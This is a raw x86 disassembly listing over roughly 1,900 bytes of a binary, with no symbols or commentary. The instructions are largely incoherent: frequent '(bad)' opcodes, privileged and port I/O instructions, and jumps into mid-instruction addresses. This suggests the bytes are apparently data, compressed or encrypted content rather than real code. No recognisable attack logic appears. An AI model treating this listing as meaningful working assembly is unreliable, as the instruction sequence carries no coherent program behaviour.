  408f01:	jnp    0x408eee
  408f03:	bnd ret 
  408f05:	iret   
  408f06:	adc    ah,dh
  408f08:	popa   
  408f09:	(bad)  
  408f0a:	fidiv  DWORD PTR [ebx+0x42]
  408f0d:	mov    ch,0x27
  408f0f:	test   DWORD PTR [ecx],eax
  408f11:	push   ebp
  408f12:	jmp    0x408f77
  408f14:	xor    ah,BYTE PTR [ebx]
  408f16:	ret    0xc3b8
  408f19:	push   0x4e
  408f1b:	push   0x5f
  408f1d:	out    0xc2,al
  408f1f:	ins    BYTE PTR es:[edi],dx
  408f20:	mov    esi,DWORD PTR [edi+0x1d83de7c]
  408f26:	rol    ecx,1
  408f28:	(bad)  
  408f29:	fild   DWORD PTR [edi]
  408f2b:	push   edx
  408f2c:	retf   0x7e23
  408f2f:	(bad)  
  408f31:	loopne 0x408ed9
  408f33:	adc    al,0x5
  408f35:	pop    eax
  408f36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408f37:	sar    BYTE PTR [ebx],1
  408f39:	sbb    ebp,DWORD PTR [eax]
  408f3b:	pop    eax
  408f3c:	ror    esi,1
  408f3e:	jb     0x408f03
  408f40:	mov    al,ds:0x8a527e06
  408f45:	mov    esp,0x55d5ff3e
  408f4a:	xchg   ecx,eax
  408f4b:	xchg   ebx,eax
  408f4c:	adc    eax,0xc54c3607
  408f51:	jp     0x408fc0
  408f53:	adc    eax,0xf6237d10
  408f58:	xor    BYTE PTR [eax+0x53c5b34],ah
  408f5e:	push   edx
  408f5f:	mov    ds:0x10a894d5,al
  408f64:	mov    bh,0x3
  408f66:	pop    edx
  408f67:	in     eax,0xda
  408f69:	arpl   ax,ax
  408f6b:	mov    ebx,0xd18eafc1
  408f70:	int    0x1e
  408f72:	fsub   DWORD PTR [ecx+0x6eccfde3]
  408f78:	lods   eax,DWORD PTR ds:[esi]
  408f79:	loop   0x408f78
  408f7b:	xor    esi,DWORD PTR [ebp+0x137fe001]
  408f81:	xchg   esi,eax
  408f82:	pop    ecx
  408f83:	ret    
  408f84:	fadd   DWORD PTR [esi-0x10]
  408f87:	add    DWORD PTR [esi-0x3c],0x7a
  408f8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408f8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408f8d:	int3   
  408f8e:	lds    eax,FWORD PTR [esi-0x70642b1f]
  408f94:	ret    0x4285
  408f97:	test   BYTE PTR [edi-0x62],cl
  408f9a:	test   esi,ecx
  408f9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408f9d:	arpl   WORD PTR ds:0xfafdd624,sp
  408fa3:	xchg   ebx,eax
  408fa4:	sti    
  408fa5:	loopne 0x408f2d
  408fa7:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  408fa9:	icebp  
  408faa:	jg     0x408fcc
  408fac:	fwait
  408fad:	xchg   BYTE PTR [esi+0x4589c556],dl
  408fb3:	mov    eax,ds:0xe0171fb2
  408fb8:	scas   al,BYTE PTR es:[edi]
  408fb9:	ror    BYTE PTR [ebp+edx*4-0x1d652fdd],1
  408fc0:	dec    edi
  408fc1:	ret    
  408fc2:	xchg   BYTE PTR [edi+ebp*8],cl
  408fc5:	or     edi,ecx
  408fc7:	bound  eax,QWORD PTR [eax+0x15]
  408fca:	imul   DWORD PTR [ebx-0xf]
  408fcd:	add    al,0xb5
  408fcf:	mov    cl,0xb
  408fd1:	in     al,0x2
  408fd3:	mov    cl,0x33
  408fd5:	cwde   
  408fd6:	leave  
  408fd7:	imul   ebp,DWORD PTR [ecx+edi*4-0x6edfbd57],0x67
  408fdf:	das    
  408fe0:	mov    ?,WORD PTR [ebp+0x4e]
  408fe3:	outs   dx,DWORD PTR ds:[esi]
  408fe4:	test   dl,0x2a
  408fe7:	(bad)  
  408fe9:	iret   
  408fea:	mov    edi,0xbd5bc3a
  408fef:	mov    dh,0xdc
  408ff1:	leave  
  408ff2:	clc    
  408ff3:	jecxz  0x408fbc
  408ff5:	mov    ds:0x687acd79,al
  408ffa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ffb:	or     BYTE PTR [ebx-0x12],ah
  408ffe:	fwait
  408fff:	loop   0x409031
  409001:	fcomp  DWORD PTR [edi-0x7762b40c]
  409007:	fnstenv [edx]
  409009:	fsub   DWORD PTR [edi-0x4]
  40900c:	jmp    0xf131d989
  409011:	pusha  
  409012:	ss mov cl,0xe6
  409015:	add    eax,DWORD PTR [ebp-0x5d781994]
  40901b:	and    eax,0xc1b0da11
  409020:	push   cs
  409021:	outs   dx,BYTE PTR ds:[esi]
  409022:	dec    esp
  409023:	lods   al,BYTE PTR ds:[esi]
  409024:	daa    
  409025:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409026:	sbb    al,0xf3
  409028:	jl     0x409024
  40902a:	jb     0x40901e
  40902c:	lock add BYTE PTR [eax],bh
  40902f:	inc    ebx
  409030:	xlat   BYTE PTR ds:[ebx]
  409031:	xor    BYTE PTR [esi+eiz*8-0x5ac6a9fe],0x2f
  409039:	gs (bad) 
  40903b:	call   0xe4c6:0x23f5f
  409042:	pop    edi
  409043:	vmread DWORD PTR [ebp+0x46],edi
  409047:	stos   DWORD PTR es:[edi],eax
  409048:	mov    dh,0xc4
  40904a:	push   ss
  40904b:	ins    DWORD PTR es:[edi],dx
  40904c:	xchg   BYTE PTR [esi-0x2f4ad20d],al
  409052:	nop
  409053:	dec    ecx
  409054:	inc    edi
  409055:	idiv   BYTE PTR [esi-0x33]
  409058:	mov    esi,0xa3abd308
  40905d:	lea    esp,[eax]
  40905f:	mov    esi,0x4d47acd0
  409064:	xor    dh,BYTE PTR ds:0xe5fca00e
  40906a:	lods   eax,DWORD PTR ds:[esi]
  40906b:	jp     0x409007
  40906d:	les    esi,FWORD PTR ds:0x77b7b4e0
  409073:	int3   
  409074:	push   esp
  409075:	mov    bh,0x87
  409077:	inc    ebp
  409078:	pusha  
  409079:	enter  0xc78f,0x34
  40907d:	sahf   
  40907e:	test   BYTE PTR ds:[esi-0x336e8dd1],ah
  409085:	imul   edx,DWORD PTR [ebp+0x471d445c],0xffffff85
  40908c:	test   eax,0x1f51703d
  409091:	jp     0x4090db
  409093:	xor    DWORD PTR [edi+edx*8],edx
  409096:	mov    eax,ds:0x766eb34
  40909b:	add    ch,BYTE PTR [edi-0x24af4a03]
  4090a1:	arpl   WORD PTR [edi-0xa],dx
  4090a4:	or     DWORD PTR ds:0xb1c508ca,esi
  4090aa:	inc    ecx
  4090ab:	and    eax,0x9df6257e
  4090b0:	push   cs
  4090b1:	cld    
  4090b2:	sub    eax,0xbfdc454c
  4090b7:	jno    0x4090e3
  4090b9:	std    
  4090ba:	xchg   esp,eax
  4090bb:	dec    ebx
  4090bc:	jl     0x40912e
  4090be:	rol    bh,1
  4090c0:	push   eax
  4090c1:	clc    
  4090c2:	pop    ebp
  4090c3:	adc    ebx,eax
  4090c5:	mov    bl,0xd7
  4090c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4090c8:	out    0x7c,al
  4090ca:	inc    edi
  4090cb:	aaa    
  4090cc:	retf   0x6744
  4090cf:	out    0xd1,al
  4090d1:	outs   dx,BYTE PTR ds:[esi]
  4090d2:	(bad)  
  4090d3:	fstp   TBYTE PTR [ecx]
  4090d5:	jae    0x40907a
  4090d7:	mov    ds:0xb6655f49,eax
  4090dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4090dd:	jmp    0x9b12945
  4090e2:	xchg   ebx,eax
  4090e3:	adc    DWORD PTR [eax],ebp
  4090e5:	sub    eax,0x67ae3bc2
  4090ea:	andnps xmm6,XMMWORD PTR ds:0x547f3e6b
  4090f1:	mov    ebp,0x4d2cb482
  4090f6:	inc    ecx
  4090f7:	jbe    0x409176
  4090f9:	dec    ecx
  4090fa:	rcr    BYTE PTR ds:0x6f04d053,cl
  409100:	dec    edi
  409101:	inc    ebx
  409102:	mov    eax,eax
  409104:	mov    eax,ds:0xacbe44d5
  409109:	xor    DWORD PTR [eax-0x2ea449e6],edi
  40910f:	pop    es
  409110:	sbb    bh,BYTE PTR ds:0x87c5b285
  409116:	push   ss
  409117:	jns    0x4090a5
  409119:	xchg   ecx,eax
  40911a:	gs iret 
  40911c:	pop    esp
  40911d:	fwait
  40911e:	jecxz  0x409177
  409120:	jae    0x4090a9
  409122:	mov    ds:0xbdeddb03,al
  409127:	add    bl,BYTE PTR [eax-0x2c0c3c64]
  40912d:	ins    DWORD PTR es:[edi],dx
  40912e:	xchg   esp,eax
  40912f:	stc    
  409130:	aaa    
  409131:	pop    ebp
  409132:	dec    bl
  409134:	cwde   
  409135:	fisttp DWORD PTR [edi+0x26c34ff2]
  40913b:	ror    DWORD PTR [eax-0x2ad4e703],1
  409141:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409142:	mov    esi,0x90e5eb0a
  409147:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409148:	imul   ecx,DWORD PTR [ebx],0x68e6e8a7
  40914e:	call   0x6bc1:0xff61a24e
  409155:	sbb    ebx,DWORD PTR [edx]
  409157:	sub    eax,0xb28c69d1
  40915c:	mov    edx,0xd255ba70
  409161:	pusha  
  409162:	jecxz  0x409142
  409164:	add    BYTE PTR [ebx-0xb],bl
  409167:	cli    
  409168:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409169:	cli    
  40916a:	push   ss
  40916b:	dec    ebp
  40916c:	jmp    DWORD PTR [eax+eiz*8+0x4a54803c]
  409173:	cs mov esi,0x62a35be6
  409179:	sahf   
  40917a:	das    
  40917b:	xor    DWORD PTR [esi-0x203e4d68],ebx
  409181:	sbb    BYTE PTR [esp+edx*1-0x1f],dh
  409185:	repz sar DWORD PTR [ebx+0x5562322e],1
  40918c:	pop    ss
  40918d:	mov    ds:0xa2295ad4,eax
  409192:	(bad)  
  409193:	dec    BYTE PTR [esi+0x3dea591]
  409199:	adc    esi,ebp
  40919b:	cmp    dl,BYTE PTR [eax+0x5ad37295]
  4091a1:	add    DWORD PTR [edx-0x782ff846],eax
  4091a7:	jge    0x4091cd
  4091a9:	bound  eax,QWORD PTR [ebp+0x61d74ba6]
  4091af:	popf   
  4091b0:	ror    DWORD PTR [ecx-0x5e],0x1f
  4091b4:	test   eax,0xfde3a726
  4091b9:	push   edx
  4091ba:	(bad)  
  4091bb:	mov    dh,bh
  4091bd:	lds    edi,FWORD PTR [edx-0x7]
  4091c0:	xchg   DWORD PTR [esi+0xb],eax
  4091c3:	and    al,al
  4091c5:	cmp    ah,dl
  4091c7:	das    
  4091c8:	dec    esi
  4091c9:	inc    esi
  4091ca:	cmc    
  4091cb:	pushf  
  4091cc:	inc    ebx
  4091cd:	retf   
  4091ce:	loopne 0x4091f3
  4091d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4091d1:	mov    ecx,ss
  4091d3:	fadd   DWORD PTR [edx]
  4091d5:	arpl   cx,ax
  4091d7:	cmc    
  4091d8:	xchg   DWORD PTR [ebp+0x523f2e7f],ecx
  4091de:	and    al,0x98
  4091e0:	scas   al,BYTE PTR es:[edi]
  4091e1:	ret    0x8679
  4091e4:	std    
  4091e5:	cld    
  4091e6:	jge    0x409221
  4091e8:	sub    al,0xf6
  4091ea:	fs loopne 0x4091bb
  4091ed:	fnsave [ecx+0x5]
  4091f0:	sub    bl,BYTE PTR [edx+0x3]
  4091f3:	inc    ecx
  4091f4:	mov    bl,0x5d
  4091f6:	pop    ds
  4091f7:	mov    ebx,0x5edec133
  4091fc:	mov    edx,0x838685af
  409201:	dec    edx
  409202:	xor    BYTE PTR [edx+eax*4-0x190a042f],ch
  409209:	repnz loopne 0x4091a0
  40920c:	aad    0x65
  40920e:	ror    BYTE PTR [ebp+0x51844ebb],1
  409214:	inc    esi
  409215:	or     ah,bl
  409217:	pop    ss
  409218:	mov    dh,0xb5
  40921a:	or     BYTE PTR [ebp-0x55],bl
  40921d:	fstp   DWORD PTR [edx+edi*1+0x2d9fa505]
  409224:	cmp    al,0x4e
  409226:	jge    0x40920c
  409228:	scas   al,BYTE PTR es:[edi]
  409229:	loop   0x409219
  40922b:	mov    ecx,DWORD PTR [edi+0x3b]
  40922e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40922f:	xchg   edx,eax
  409230:	push   ss
  409231:	push   edx
  409232:	adc    al,0x63
  409234:	(bad)  
  409235:	neg    DWORD PTR [ebp-0x36]
  409238:	(bad)  
  409239:	push   ebp
  40923a:	mov    ebp,0xd458b57b
  40923f:	aaa    
  409240:	xchg   esp,eax
  409241:	cwde   
  409242:	sti    
  409243:	mov    esi,0x17f8d8d6
  409248:	into   
  409249:	cmc    
  40924a:	mov    eax,ds:0xb33670bc
  40924f:	inc    ecx
  409250:	mov    eax,0x4144536c
  409255:	dec    edi
  409256:	adc    edi,DWORD PTR [eax]
  409258:	adc    DWORD PTR [ecx-0x1f],esp
  40925b:	inc    esp
  40925c:	inc    edi
  40925d:	sar    DWORD PTR [edi-0x65eb56ef],1
  409263:	xor    al,0xf1
  409265:	sbb    eax,DWORD PTR [ecx-0x23]
  409268:	jbe    0x409254
  40926a:	out    0x81,eax
  40926c:	mov    ?,WORD PTR [ebx+0x6c3107aa]
  409272:	mov    dh,0xf5
  409274:	pop    ds
  409275:	fldcw  WORD PTR [ecx]
  409277:	std    
  409278:	pop    esp
  409279:	lock fcom QWORD PTR [ebp-0x652518b5]
  409280:	scas   eax,DWORD PTR es:[edi]
  409281:	ror    BYTE PTR ds:0x1880aef2,cl
  409287:	dec    eax
  409288:	xchg   edx,eax
  409289:	inc    ebp
  40928a:	and    DWORD PTR [esi],esp
  40928c:	jb     0x4092fc
  40928e:	mov    ebp,edx
  409290:	shl    BYTE PTR ds:0x71829c4,1
  409296:	fidiv  DWORD PTR [esi+ebx*4]
  409299:	add    DWORD PTR [ecx+ebx*2-0x5b],0x682e569e
  4092a1:	mov    eax,ds:0x362e843c
  4092a6:	inc    esp
  4092a7:	outs   dx,BYTE PTR ds:[esi]
  4092a8:	rcr    DWORD PTR ds:0xac1cf212,1
  4092ae:	adc    ecx,DWORD PTR [edi+eiz*4]
  4092b1:	jge    0x4092cd
  4092b3:	idiv   eax
  4092b5:	daa    
  4092b6:	call   0xbbdf4fc0
  4092bb:	jne    0x409292
  4092bd:	rol    BYTE PTR [ebp-0x492cbd85],1
  4092c3:	sti    
  4092c4:	inc    edx
  4092c5:	pmaxub mm3,mm2
  4092c8:	retf   0x63ac
  4092cb:	leave  
  4092cc:	outs   dx,BYTE PTR ds:[esi]
  4092cd:	adc    ecx,esp
  4092cf:	ret    0x208
  4092d2:	inc    esi
  4092d3:	inc    edx
  4092d4:	xor    al,0x86
  4092d6:	add    esi,DWORD PTR [edi]
  4092d8:	mov    al,0x54
  4092da:	int    0xc
  4092dc:	sbb    ch,ch
  4092de:	pop    ss
  4092df:	pop    esi
  4092e0:	dec    ebp
  4092e1:	mov    eax,0xad05d71e
  4092e6:	mov    ecx,0xdb6b595e
  4092eb:	loope  0x409297
  4092ed:	or     ebp,edi
  4092ef:	ret    0x7e09
  4092f2:	lods   al,BYTE PTR ds:[esi]
  4092f3:	hlt    
  4092f4:	mov    edx,edi
  4092f6:	imul   ebx,eax,0x7fc0c0c1
  4092fc:	xchg   ecx,eax
  4092fd:	mov    WORD PTR [eax-0x71],es
  409300:	push   0x36
  409302:	sub    esp,esp
  409304:	sbb    al,0x1c
  409307:	in     eax,0xb2
  409309:	push   0xfffffff2
  40930b:	cwde   
  40930c:	sub    BYTE PTR [esi-0x23],ah
  40930f:	push   ebx
  409310:	push   edi
  409311:	nop
  409312:	das    
  409313:	das    
  409314:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409315:	ins    DWORD PTR es:[edi],dx
  409316:	js     0x4092ad
  409318:	test   al,0x31
  40931a:	hlt    
  40931b:	mov    ah,0x3b
  40931d:	or     ebp,DWORD PTR [ecx+0x3e9a3ea9]
  409323:	xchg   ebp,eax
  409324:	arpl   WORD PTR [eax],sp
  409326:	xor    BYTE PTR [ecx-0x1732afa0],dh
  40932c:	inc    ebp
  40932d:	fs (bad) 
  409331:	mov    ds,WORD PTR [esi-0x3adfe5df]
  409337:	fcmove st,st(1)
  409339:	cdq    
  40933a:	popf   
  40933b:	pop    esi
  40933c:	dec    edx
  40933d:	sbb    BYTE PTR [edi-0x4a02f874],cl
  409343:	or     al,0xb6
  409345:	mov    dh,0x79
  409347:	(bad)  
  409348:	bound  ecx,QWORD PTR [eax+0x3a29027]
  40934e:	xlat   BYTE PTR ds:[ebx]
  40934f:	fidivr WORD PTR [esi+edi*1+0x21]
  409353:	mov    dl,0xd7
  409355:	or     esi,esi
  409357:	xchg   DWORD PTR [edi+0x1a],edx
  40935a:	(bad)  
  40935b:	daa    
  40935c:	std    
  40935d:	add    DWORD PTR [esi+0x79],edi
  409360:	pop    esi
  409361:	cmc    
  409362:	mov    ?,WORD PTR [ebp-0x2]
  409365:	ret    
  409366:	aas    
  409367:	push   esp
  409368:	enter  0x34ff,0xeb
  40936c:	bound  esi,QWORD PTR [ebp+edx*2-0x62]
  409370:	fild   QWORD PTR [ecx+0x32d4120a]
  409376:	jo     0x4093ab
  409378:	xor    ebp,DWORD PTR [esp+ebx*1+0x7b24c41e]
  40937f:	and    DWORD PTR [edx],esi
  409381:	or     BYTE PTR [ebx+ebx*2+0x4870ce81],0x4a
  409389:	cwde   
  40938a:	lea    edx,[esi+ebx*8+0x33a84e7e]
  409391:	sti    
  409392:	retf   0xb97a
  409395:	int3   
  409396:	dec    esp
  409397:	xchg   ebx,eax
  409398:	fwait
  409399:	mov    al,0xbb
  40939b:	sub    al,0x20
  40939d:	pop    esp
  40939e:	test   DWORD PTR ds:0x6a416d23,esi
  4093a4:	sub    BYTE PTR [eax],ah
  4093a6:	(bad)  
  4093a7:	(bad)  
  4093a9:	je     0x40934d
  4093ab:	leave  
  4093ac:	push   0xf
  4093ae:	jno    0x4093a7
  4093b0:	jp     0x40934e
  4093b2:	jne    0x4093e2
  4093b4:	mov    BYTE PTR [edx-0x7aec1806],al
  4093ba:	fidivr WORD PTR [esi]
  4093bc:	cmp    DWORD PTR [ecx-0x72],edx
  4093bf:	dec    ebp
  4093c0:	sub    edx,DWORD PTR ds:0x7371a3dd
  4093c6:	mov    esp,0x79737f55
  4093cb:	pop    ebx
  4093cc:	mov    ecx,0x2b10194d
  4093d1:	and    al,0xfc
  4093d3:	dec    eax
  4093d4:	mov    edx,0x3d56fff6
  4093d9:	das    
  4093da:	or     eax,0x16878692
  4093df:	mov    BYTE PTR [esp+esi*8-0x796b26df],bl
  4093e6:	cmp    esp,DWORD PTR [ecx]
  4093e8:	imul   eax,DWORD PTR [eax],0x1121efb9
  4093ee:	jbe    0x4093b8
  4093f0:	dec    ebx
  4093f1:	in     eax,0x2c
  4093f3:	mov    ecx,0x78933e6a
  4093f8:	(bad)  
  4093f9:	(bad)  
  4093fa:	call   FWORD PTR [esp+edx*4]
  4093fd:	mov    dh,0x9c
  4093ff:	dec    ecx
  409400:	mov    esi,0x11164800
  409405:	or     BYTE PTR [ebx+0x15],0x3a
  409409:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40940a:	test   eax,0x184fe317
  40940f:	fwait
  409410:	in     al,0xd1
  409412:	leave  
  409413:	jnp    0x409437
  409415:	outs   dx,DWORD PTR ds:[esi]
  409416:	pusha  
  409417:	and    cl,BYTE PTR [ebx-0x75]
  40941a:	adc    DWORD PTR [edx],ecx
  40941c:	jmp    0x409424
  40941e:	popf   
  40941f:	pop    ebp
  409420:	cmp    edx,DWORD PTR [ebp-0x5328741c]
  409426:	je     0x409453
  409428:	fistp  QWORD PTR [ebx+0x2a]
  40942b:	loope  0x4093cc
  40942d:	cmp    eax,0x3a7fa5e
  409432:	adc    BYTE PTR ds:0xb221f6f0,ch
  409438:	into   
  409439:	push   ecx
  40943a:	mov    al,ds:0x2c9ed9c6
  40943f:	enter  0x7865,0xc6
  409443:	pop    edi
  409444:	jae    0x4093e6
  409446:	in     al,0xb8
  409448:	dec    ecx
  409449:	loop   0x409425
  40944b:	dec    DWORD PTR [esi+0x26]
  40944e:	stc    
  40944f:	dec    edx
  409450:	pop    edi
  409451:	adc    eax,0xeb6101ec
  409456:	mov    ecx,0x39afffe2
  40945b:	sbb    al,0x46
  40945d:	popf   
  40945e:	xor    DWORD PTR [eax+0x73],esp
  409461:	mov    ebp,0xd1a59512
  409466:	mov    ch,bh
  409468:	(bad)  
  409469:	xor    BYTE PTR [ebx],bh
  40946b:	data16 jo 0x40948a
  40946e:	les    ebx,FWORD PTR [edx-0x19]
  409471:	lods   eax,DWORD PTR ds:[esi]
  409472:	sti    
  409473:	enter  0x5e06,0xa5
  409477:	sub    ebx,DWORD PTR [eax-0xc]
  40947a:	scas   al,BYTE PTR es:[edi]
  40947b:	push   0x41
  40947d:	cs sub ch,ch
  409480:	shl    DWORD PTR [ebp-0x1bc1f96],0x29
  409487:	sub    al,BYTE PTR [ecx-0xb]
  40948a:	test   al,0xd5
  40948c:	pop    esp
  40948d:	out    0xa8,al
  40948f:	mov    al,0xaa
  409491:	les    ebx,FWORD PTR [eax+eiz*4]
  409494:	in     eax,0x60
  409496:	jl     0x409427
  409498:	neg    DWORD PTR [ebx]
  40949a:	pushw  ss
  40949c:	mov    ebp,0x5461fc9d
  4094a1:	xor    bh,ah
  4094a3:	sbb    ah,bh
  4094a5:	pop    edi
  4094a6:	cmp    BYTE PTR [edx+0x3a],dh
  4094a9:	test   BYTE PTR [edx],dl
  4094ab:	loop   0x40943d
  4094ad:	sbb    eax,0xe55ce7a9
  4094b2:	jl     0x409456
  4094b4:	in     al,dx
  4094b5:	push   ecx
  4094b6:	sub    ah,BYTE PTR [ebp+0xa0c7188]
  4094bc:	fnstcw WORD PTR [edi-0x342cfacc]
  4094c2:	xchg   BYTE PTR [edx-0x37],dh
  4094c5:	cmp    bh,BYTE PTR [edi+0x58]
  4094c8:	sub    eax,0x7c1e555b
  4094cd:	cld    
  4094ce:	sti    
  4094cf:	test   BYTE PTR [ecx-0x3f],dl
  4094d2:	cmp    esp,DWORD PTR [ecx+edi*2-0x16]
  4094d6:	sub    eax,0x68d55129
  4094db:	xchg   ecx,eax
  4094dc:	mov    ebx,es
  4094de:	xor    al,BYTE PTR [esi+0x18]
  4094e1:	inc    edi
  4094e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4094e3:	lock and cl,BYTE PTR [edi+ebp*4-0x68]
  4094e8:	gs xor eax,0x1f5ec46a
  4094ee:	pop    ebx
  4094ef:	xor    eax,0x9240421b
  4094f4:	push   cs
  4094f5:	jle    0x4094fc
  4094f7:	pop    ss
  4094f8:	sbb    eax,0x72387b7
  4094fd:	push   edi
  4094fe:	adc    al,0x34
  409500:	js     0x4094b8
  409502:	bound  ebp,QWORD PTR [edi+0x4fbcfb52]
  409508:	stos   BYTE PTR es:[edi],al
  409509:	jp     0x409549
  40950b:	dec    edx
  40950c:	and    BYTE PTR [ecx+0x3c],dh
  40950f:	and    DWORD PTR [ecx+0x3c],edx
  409512:	xchg   edi,eax
  409513:	mov    ds:0x99fc181d,al
  409518:	jecxz  0x4094dc
  40951a:	ja     0x40955b
  40951c:	rcr    eax,0x65
  40951f:	sti    
  409520:	and    edx,ebx
  409522:	pop    ds
  409523:	jmp    FWORD PTR [ebx+0xf11a3b2]
  409529:	push   esi
  40952a:	push   es
  40952b:	es leave 
  40952d:	sti    
  40952e:	icebp  
  40952f:	xchg   BYTE PTR [eax-0x3],cl
  409532:	mov    esi,0x52060344
  409537:	out    dx,eax
  409538:	mov    ecx,0xbdc5e536
  40953d:	push   cs
  40953e:	mov    edx,0x3f937c5b
  409543:	rcr    esi,0xeb
  409546:	jno    0x409506
  409548:	fadd   st,st(1)
  40954a:	ss loopne 0x4095c0
  40954d:	fld    QWORD PTR ds:0x2235f3da
  409553:	ficom  DWORD PTR [edi-0x153ff875]
  409559:	mov    esp,0xaf310ea9
  40955e:	pushf  
  40955f:	sub    dh,BYTE PTR [eax-0x3]
  409562:	mov    bl,0x92
  409564:	cs int 0x2e
  409567:	pop    edx
  409568:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409569:	fbstp  TBYTE PTR [ecx-0x5464198d]
  40956f:	jne    0x4095cb
  409571:	add    eax,ebx
  409573:	sti    
  409574:	xchg   edi,eax
  409575:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409576:	add    DWORD PTR [edi+0x10],0x33
  40957a:	mov    eax,0xe753fe0a
  40957f:	(bad)  
  409580:	mov    dl,0x91
  409582:	xchg   esi,eax
  409583:	inc    BYTE PTR [ebp+0x77f22964]
  409589:	dec    eax
  40958a:	xor    DWORD PTR [esi+0x44],ecx
  40958d:	adc    esi,DWORD PTR [edi]
  40958f:	mov    bl,bh
  409591:	leave  
  409592:	mov    BYTE PTR ds:0xa657b8ff,al
  409598:	int3   
  409599:	in     eax,dx
  40959a:	fidiv  DWORD PTR [edi-0x12]
  40959d:	sbb    ch,dh
  40959f:	cmp    al,0x40
  4095a1:	sbb    DWORD PTR [esi+0x21],ebx
  4095a4:	imul   edx,DWORD PTR [edi-0x18],0xffffffb3
  4095a8:	jg     0x40961e
  4095aa:	ret    0xa78e
  4095ad:	pop    edx
  4095ae:	xchg   ebp,eax
  4095af:	mov    WORD PTR [edi],fs
  4095b1:	aam    0xbe
  4095b3:	sahf   
  4095b4:	adc    DWORD PTR [ebx],0x56
  4095b7:	rcr    BYTE PTR [edx],0xac
  4095ba:	test   BYTE PTR [edi],dl
  4095bc:	jnp    0x4095dc
  4095be:	data16 arpl WORD PTR [eax+edx*4-0x4f],ax
  4095c3:	and    bh,BYTE PTR [ecx-0x41]
  4095c6:	mov    WORD PTR [ebx],gs
  4095c8:	stc    
  4095c9:	test   al,cl
  4095cb:	sar    BYTE PTR [esi-0x57],1
  4095ce:	bound  eax,QWORD PTR [edx]
  4095d0:	jb     0x40956f
  4095d2:	xor    eax,0x4f12900c
  4095d7:	jns    0x40960c
  4095d9:	xchg   edi,eax
  4095da:	adc    BYTE PTR [ebx+eiz*4],ch
  4095dd:	sahf   
  4095de:	inc    ebx
  4095df:	push   edx
  4095e0:	jno    0x4095f9
  4095e2:	in     al,dx
  4095e3:	mov    ds:0x6f713cd1,al
  4095e8:	(bad)  
  4095e9:	daa    
  4095ea:	or     edx,DWORD PTR [ebx+0x550267f1]
  4095f0:	or     BYTE PTR [ecx],dl
  4095f2:	xchg   ebp,eax
  4095f3:	pop    ebx
  4095f4:	jmp    0x4095f8
  4095f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4095f7:	sahf   
  4095f8:	mov    bh,0xe2
  4095fa:	cmp    bh,BYTE PTR [edx]
  4095fc:	and    esi,DWORD PTR [edi+edx*8]
  4095ff:	mov    dh,0x5a
  409601:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409602:	popa   
  409603:	cmp    BYTE PTR [esi],bl
  409605:	cmp    esi,DWORD PTR [esi+esi*1-0x47]
  409609:	daa    
  40960a:	adc    BYTE PTR [eax+0x2fedc5e4],0x9e
  409611:	aas    
  409612:	aam    0xf6
  409614:	cmp    ebx,DWORD PTR [ebx-0x7c]
  409617:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409618:	jns    0x409602
  40961a:	push   ebp
  40961b:	xchg   ecx,eax
  40961c:	fmulp  st(6),st
  40961e:	(bad)  
  40961f:	loopne 0x409665
  409621:	mov    al,ds:0xd1bc9e17
  409626:	xchg   edi,eax
  409627:	pusha  
  409628:	pushf  
  409629:	cmp    eax,0x1cdefee3
  40962e:	(bad)  
  40962f:	loopne 0x409636
  409631:	pop    ebx
  409632:	nop
  409633:	mov    edx,0xd78785e
  409638:	retf   0xd68
  40963b:	(bad)  
  40963c:	jecxz  0x4096a1
  40963e:	outs   dx,BYTE PTR ds:[esi]
  40963f:	push   esp
  409640:	adc    eax,0x5a374ea6
  409645:	ja     0x4095db
  409647:	cld    
  409648:	push   ebx
  409649:	lods   eax,DWORD PTR ds:[esi]
  40964a:	fcomp  DWORD PTR [edx+0xe502f93]
  409650:	(bad)  
  409651:	fisubr DWORD PTR [ebp-0xd23ad60]
  409657:	mov    edi,0x20cf1e53
  40965c:	shr    DWORD PTR [edi],cl
  40965e:	mov    dh,0xc8
  409660:	pop    es
  409661:	addr16 jb 0x409600
  409664:	sub    eax,0xf3da0963
  409669:	leave  
  40966a:	daa    
  40966b:	fwait
  40966c:	das    
  40966d:	test   edi,ebp
  40966f:	mov    ebx,0xaa58fa31
  409674:	sub    DWORD PTR [edx],0xf
  409677:	sti    
  409678:	mov    ah,0xe7
  40967a:	pop    edx
  40967b:	adc    eax,0x822a8a6c
  409680:	mov    eax,0x5d27645d
  409685:	je     0x40963d
  409687:	xlat   BYTE PTR ds:[ebx]
  409688:	xor    ah,BYTE PTR [ebp-0xf]
  40968b:	dec    edx
  40968c:	sbb    dl,BYTE PTR [eax+ebx*4+0x3e9217b5]
  409693:	call   0x202368e4
  409698:	test   eax,0x2348595a
  40969d:	push   ss
  40969e:	div    DWORD PTR [ebp-0x5bbc181b]
  4096a4:	and    BYTE PTR [ecx+0x56e0a707],cl
  4096aa:	push   ds
  4096ab:	xchg   edx,eax
  4096ac:	out    0x36,al
  4096ae:	cs xchg edi,eax
  4096b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4096b1:	adc    DWORD PTR fs:[edi],ebx
  4096b4:	lea    ecx,[ebx+0x3b]
  4096b7:	scas   al,BYTE PTR es:[edi]
